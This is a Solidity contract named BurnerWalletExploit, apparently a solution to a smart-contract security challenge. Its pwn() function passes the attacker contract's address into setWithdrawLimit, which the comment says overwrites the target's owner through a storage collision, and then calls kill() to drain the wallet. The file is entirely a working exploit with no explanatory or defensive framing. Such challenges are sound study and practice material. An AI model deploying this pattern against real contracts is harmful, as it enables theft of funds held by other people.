// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IBurnerWallet {
    function setWithdrawLimit(uint256 limit) external;
    function kill() external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // set owner to this contract
        IBurnerWallet(target).setWithdrawLimit(uint256(uint160(address(this))));
        // kill to drain wallet
        IBurnerWallet(target).kill();
    }
}
